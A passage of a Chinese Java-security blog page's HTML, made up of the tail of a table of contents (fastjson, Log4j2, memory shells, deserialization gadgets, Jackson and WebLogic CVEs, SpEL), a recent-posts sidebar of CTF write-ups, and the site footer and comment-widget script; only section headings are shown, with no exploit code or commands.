class="toc-number">14.4.2.</span> <span class="toc-text">42开始以hash黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#25-42"><span class="toc-number">14.4.2.1.</span> <span class="toc-text">25-42</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-43"><span class="toc-number">14.4.2.2.</span> <span class="toc-text">25-43</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-45"><span class="toc-number">14.4.2.3.</span> <span class="toc-text">25-45</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#25-47"><span class="toc-number">14.4.2.4.</span> <span class="toc-text">25-47</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#49"><span class="toc-number">14.4.2.5.</span> <span class="toc-text">49</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-59"><span class="toc-number">14.4.2.6.</span> <span class="toc-text">5-59</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-60"><span class="toc-number">14.4.2.7.</span> <span class="toc-text">5-60</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-61"><span class="toc-number">14.4.2.8.</span> <span class="toc-text">5-61</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-48"><span class="toc-number">14.4.3.</span> <span class="toc-text">1.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%88%86%E6%9E%90"><span class="toc-number">14.4.3.1.</span> <span class="toc-text">初始分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-62"><span class="toc-number">14.4.4.</span> <span class="toc-text">1.2.62</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-66"><span class="toc-number">14.4.5.</span> <span class="toc-text">1.2.66</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-67"><span class="toc-number">14.4.6.</span> <span class="toc-text">1.2.67</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-68"><span class="toc-number">14.4.7.</span> <span class="toc-text">1.2.68</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp%E4%BB%A3%E7%A0%81"><span class="toc-number">14.4.7.1.</span> <span class="toc-text">exp代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">14.4.8.</span> <span class="toc-text">实际利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">14.4.8.1.</span> <span class="toc-text">文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B1%BB"><span class="toc-number">14.4.8.1.1.</span> <span class="toc-text">利用类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">14.4.8.1.2.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#poc"><span class="toc-number">14.4.8.1.3.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">14.4.8.2.</span> <span class="toc-text">文件写入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-1"><span class="toc-number">14.4.8.2.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#poc-1"><span class="toc-number">14.4.8.2.2.</span> <span class="toc-text">poc</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#68%E5%BE%80%E5%90%8E%E5%A2%9E%E5%8A%A0%E4%BA%86safeMode"><span class="toc-number">14.5.</span> <span class="toc-text">68往后增加了safeMode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Log4j2"><span class="toc-number">15.</span> <span class="toc-text">Log4j2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3"><span class="toc-number">15.1.</span> <span class="toc-text">官方文档</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%A4%8D%E7%8E%B0%E4%BB%A3%E7%A0%81"><span class="toc-number">15.2.</span> <span class="toc-text">基础复现代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">15.2.1.</span> <span class="toc-text">环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">15.2.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#log4j2-xml"><span class="toc-number">15.2.1.2.</span> <span class="toc-text">log4j2.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%811"><span class="toc-number">15.2.1.3.</span> <span class="toc-text">漏洞代码1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%A9%E7%94%A82"><span class="toc-number">15.2.1.4.</span> <span class="toc-text">漏洞代码利用2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">15.2.2.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95waf%E7%BB%95%E8%BF%87"><span class="toc-number">15.2.2.1.</span> <span class="toc-text">简单waf绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">15.2.2.1.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">15.2.2.1.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">15.2.2.1.3.</span> <span class="toc-text">三</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9B"><span class="toc-number">15.2.2.1.4.</span> <span class="toc-text">四</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%94"><span class="toc-number">15.2.2.1.5.</span> <span class="toc-text">五</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AD"><span class="toc-number">15.2.2.1.6.</span> <span class="toc-text">六</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%82%B9%E4%B8%9C%E8%A5%BF"><span class="toc-number">15.2.3.</span> <span class="toc-text">获取点东西</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j2-2-15-0-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">15.2.4.</span> <span class="toc-text">Log4j2 2.15.0 漏洞修复与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">15.2.4.1.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%A0%81"><span class="toc-number">16.</span> <span class="toc-text">内存码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80-1"><span class="toc-number">16.1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat"><span class="toc-number">16.2.</span> <span class="toc-text">tomcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%81"><span class="toc-number">16.3.</span> <span class="toc-text">码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E7%A0%81"><span class="toc-number">16.3.1.</span> <span class="toc-text">传统码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E7%A0%81"><span class="toc-number">16.3.2.</span> <span class="toc-text">回显码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filter%E7%A0%81"><span class="toc-number">16.4.</span> <span class="toc-text">filter码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">17.</span> <span class="toc-text">二次反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%BA%BF"><span class="toc-number">17.1.</span> <span class="toc-text">路线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83"><span class="toc-number">17.2.</span> <span class="toc-text">核心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signedObject"><span class="toc-number">17.3.</span> <span class="toc-text">signedObject</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A81rome"><span class="toc-number">17.3.1.</span> <span class="toc-text">引用1rome</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80tostring"><span class="toc-number">17.3.2.</span> <span class="toc-text">一tostring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8Cequal"><span class="toc-number">17.3.3.</span> <span class="toc-text">二equal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89ObjectBean"><span class="toc-number">17.3.4.</span> <span class="toc-text">三ObjectBean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A82cb"><span class="toc-number">17.3.5.</span> <span class="toc-text">引用2cb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACfastjson%EF%BC%8C"><span class="toc-number">17.3.6.</span> <span class="toc-text">高版本fastjson，</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80BadAttributeValueExpException-readObject"><span class="toc-number">17.3.6.1.</span> <span class="toc-text">一BadAttributeValueExpException#readObject</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8CHotSwappableTargetSource"><span class="toc-number">17.3.6.2.</span> <span class="toc-text">二HotSwappableTargetSource</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMIConnector"><span class="toc-number">17.4.</span> <span class="toc-text">RMIConnector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WrapperConnectionPoolDataSource"><span class="toc-number">17.5.</span> <span class="toc-text">WrapperConnectionPoolDataSource</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C3P0-Hex"><span class="toc-number">17.5.1.</span> <span class="toc-text">C3P0_Hex</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jackson"><span class="toc-number">18.</span> <span class="toc-text">jackson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DefaultTyping"><span class="toc-number">18.1.</span> <span class="toc-text">DefaultTyping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-1"><span class="toc-number">18.1.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C-1"><span class="toc-number">18.1.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89-1"><span class="toc-number">18.1.3.</span> <span class="toc-text">三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B-1"><span class="toc-number">18.1.4.</span> <span class="toc-text">四</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JsonTypeInfo-%E6%B3%A8%E8%A7%A3"><span class="toc-number">18.2.</span> <span class="toc-text">@JsonTypeInfo 注解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-NONE"><span class="toc-number">18.2.1.</span> <span class="toc-text">JsonTypeInfo.Id.NONE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-CLASS"><span class="toc-number">18.2.2.</span> <span class="toc-text">JsonTypeInfo.Id.CLASS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-MINIMAL-CLASS"><span class="toc-number">18.2.3.</span> <span class="toc-text">JsonTypeInfo.Id.MINIMAL_CLASS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-NAME"><span class="toc-number">18.2.4.</span> <span class="toc-text">JsonTypeInfo.Id.NAME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JsonTypeInfo-Id-CUSTOM"><span class="toc-number">18.2.5.</span> <span class="toc-text">JsonTypeInfo.Id.CUSTOM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.3.</span> <span class="toc-text">反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-7525"><span class="toc-number">18.4.</span> <span class="toc-text">CVE-2017-7525</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">18.4.1.</span> <span class="toc-text">影响版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-17485"><span class="toc-number">18.5.</span> <span class="toc-text">CVE-2017-17485</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">18.5.1.</span> <span class="toc-text">影响版本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poc-2"><span class="toc-number">18.5.1.1.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#spel-xml"><span class="toc-number">18.5.1.2.</span> <span class="toc-text">spel.xml</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">19.</span> <span class="toc-text">yaml反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">19.1.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">20.</span> <span class="toc-text">Hessian反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring%E6%A0%B8%E5%BF%83"><span class="toc-number">21.</span> <span class="toc-text">Spring核心</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IOC"><span class="toc-number">21.1.</span> <span class="toc-text">IOC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">21.1.1.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beans-xml"><span class="toc-number">21.1.2.</span> <span class="toc-text">beans.xml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DI%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5"><span class="toc-number">21.2.</span> <span class="toc-text">DI依赖注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-P%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-number">21.3.</span> <span class="toc-text">C&#x2F;P命名空间</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WebLogic"><span class="toc-number">22.</span> <span class="toc-text">WebLogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">22.1.</span> <span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D"><span class="toc-number">22.1.1.</span> <span class="toc-text">影响</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">22.2.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-3506"><span class="toc-number">22.3.</span> <span class="toc-text">CVE-2017-3506</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D-1"><span class="toc-number">22.3.1.</span> <span class="toc-text">影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">22.3.2.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEL"><span class="toc-number">23.</span> <span class="toc-text">SpEL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Expression-%E5%BD%A2%E5%BC%8F%E7%9A%84-SpEL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">23.1.</span> <span class="toc-text">Expression 形式的 SpEL 表达式注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-number">24.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">25.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pom-xml-1"><span class="toc-number">26.</span> <span class="toc-text">pom.xml</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/JAVA%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%88%86%E4%BA%AB/" title="JAVA安全入门分享">JAVA安全入门分享</a><time datetime="2025-03-17T11:17:14.000Z" title="Created 2025-03-17 19:17:14">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记">THM笔记</a><time datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯">2024鹏程杯</a><time datetime="2025-03-17T11:12:08.000Z" title="Created 2025-03-17 19:12:08">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/27/vnctf2025javaGuide/" title="vnctf2025javaGuide">vnctf2025javaGuide</a><time datetime="2025-02-27T10:33:16.000Z" title="Created 2025-02-27 18:33:16">2025-02-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/20/25%E8%A5%BF%E6%B9%96/" title="25西湖">25西湖</a><time datetime="2025-01-20T05:22:49.000Z" title="Created 2025-01-20 13:22:49">2025-01-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>